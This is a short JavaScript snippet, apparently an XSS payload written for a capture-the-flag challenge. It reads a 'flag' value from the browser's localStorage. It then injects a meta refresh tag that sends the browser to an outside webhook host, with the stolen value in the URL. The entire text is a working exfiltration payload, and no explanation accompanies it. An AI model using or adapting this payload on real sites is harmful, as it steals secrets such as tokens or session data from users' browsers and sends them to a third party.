alert(1);

const flag = localStorage.getItem("flag");
const meta = document.createElement("meta");

meta.httpEquiv = "refresh";
meta.content = `0;url=https://purple-bear-66.webhook.cool/?arg=${flag}`;

document.head.appendChild(meta);
